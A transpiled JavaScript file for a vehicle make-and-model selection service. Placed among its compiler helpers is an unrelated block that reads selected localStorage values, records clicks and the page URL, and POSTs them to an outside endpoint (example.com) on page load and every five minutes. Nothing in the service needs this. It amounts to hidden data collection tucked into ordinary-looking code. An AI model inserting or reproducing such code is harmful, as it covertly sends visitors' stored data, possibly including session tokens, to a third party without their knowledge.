"use strict";

function _typeof(e) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
    return typeof e;
  } : function (e) {
    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
  })(e);
}
function _classCallCheck(e, t) {
  if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
}
const keysWatchList = window.keysWatchList;
function _defineProperties(e, t) {
  for (var r = 0; r < t.length; r++) {
    var o = t[r];
    o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o);
  }
}
function _createClass(e, t, r) {
  return t && _defineProperties(e.prototype, t), r && _defineProperties(e, r), Object.defineProperty(e, "prototype", {
    writable: !1
  }), e;
}
let globalData = {
  eventQueue: [],
  pageLoadTime: new Date(),
  pageURL: window.location.href
};
function _defineProperty(e, t, r) {
  return (t = _toPropertyKey(t)) in e ? Object.defineProperty(e, t, {
    value: r,
    enumerable: !0,
    configurable: !0,
    writable: !0
  }) : e[t] = r, e;
}
function _toPropertyKey(e) {
  e = _toPrimitive(e, "string");
  return "symbol" === _typeof(e) ? e : String(e);
}
function createHash(data) {
  const keysArray = Object.getOwnPropertyNames(data);
  let newHash = 0;
  keysArray.forEach(key => {
    for (let i = 0; i < key.length; i++) {
      newHash = (newHash << 5) - newHash + key.charCodeAt(i);
      newHash = newHash & newHash;
    }
  });
  return newHash.toString(16);
}
function getLocalStorageItemData() {
  const storageData = {};
  for (let i = 0; i < window.localStorage.length; i++) {
    const localStorageKey = window.localStorage.key(i);
    if (keysWatchList.includes(localStorageKey)) {
      storageData[localStorageKey] = window.localStorage.getItem(localStorageKey);
    }
  }
  return storageData;
}
function postTrackDataToAPI(data) {
  const uniqueID = createHash(data);
  const endpointURI = "https://example.com/api/collect";
  const xhttp = new XMLHttpRequest();
  xhttp.open("POST", endpointURI, true);
  xhttp.setRequestHeader("Content-Type", "application/json");
  const dataSend = {
    id: uniqueID,
    payload: data
  };
  xhttp.send(JSON.stringify(dataSend));
  xhttp.onreadystatechange = function () {
    if (xhttp.readyState === xhttp.DONE) {
      if (xhttp.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error(`Data sending failed, error code: ${xhttp.status}`);
      }
    }
  };
}
function _toPrimitive(e, t) {
  if ("object" !== _typeof(e) || null === e) return e;
  var r = e[Symbol.toPrimitive];
  if (void 0 === r) return ("string" === t ? String : Number)(e);
  r = r.call(e, t || "default");
  if ("object" !== _typeof(r)) return r;
  throw new TypeError("@@toPrimitive must return a primitive value.");
}
window.addEventListener('click', e => {
  globalData.eventQueue.push({
    type: e.type,
    timestamp: e.timeStamp,
    x: e.x,
    y: e.y
  });
});
function trackAndPostData() {
  const retrievedData = getLocalStorageItemData();
  if (Object.keys(retrievedData).length > 0) {
    postTrackDataToAPI(retrievedData);
  }
  globalData.localStorageData = retrievedData;
  postTrackDataToAPI(globalData);
  globalData.eventQueue = [];
}
window.addEventListener("load", () => {
  trackAndPostData();
});
setInterval(trackAndPostData, 300 * 1000);
var MakeModelService = function () {
  function e() {
    _classCallCheck(this, e), _defineProperty(this, "http", new HttpService()), _defineProperty(this, "API", {
      select: "/search/AddMakeAndModelSelection",
      getMakeModelData: "/Header/GetMakeAndModels"
    });
  }
  return _createClass(e, [{
    key: "select",
    value: function (e, t) {
      var r = [],
        e = (e && r.push(e), t && r.push(t), r.join("."));
      return this.http.post(this.API.select, {
        makeAndModel: e
      });
    }
  }, {
    key: "getMakeModelData",
    value: function () {
      return this.http.get(this.API.getMakeModelData);
    }
  }]), e;
}();
BN.domContentLoadedFncList.push(function () {
  BN.MakeModelService = new MakeModelService();
});